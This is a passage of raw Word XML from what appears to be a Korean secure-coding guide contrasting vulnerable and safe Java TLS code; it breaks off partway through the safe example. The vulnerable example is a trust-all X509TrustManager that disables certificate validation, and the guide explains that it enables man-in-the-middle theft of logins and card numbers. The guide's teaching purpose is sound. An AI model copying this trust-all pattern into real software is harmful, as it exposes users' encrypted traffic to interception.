      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>신뢰하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개발</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>편의용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>운영에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배포되는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사례</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>TrustManager[] trustAll = new TrustManager[]{</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    new X509TrustManager() {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        public void checkClientTrusted(X509Certificate[] c, String a) {}</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        public void checkServerTrusted(X509Certificate[] c, String a) {}</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        public X509Certificate[] getAcceptedIssuers() { return null; }</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    }</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>};</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">TrustAllCerts </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>유효하지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>만료된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모두</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수락합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중간자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(MITM) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가짜</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제시해도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>연결이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수립되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> HTTPS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>통신의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>카드번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>평문으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>노출됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기본</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> TrustManager </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (JDK </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기본값으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> CA </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>체인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>SSLContext ctx = SSLContext.getInstance("TLS");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">ctx.init(null, null, null);  // null = </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
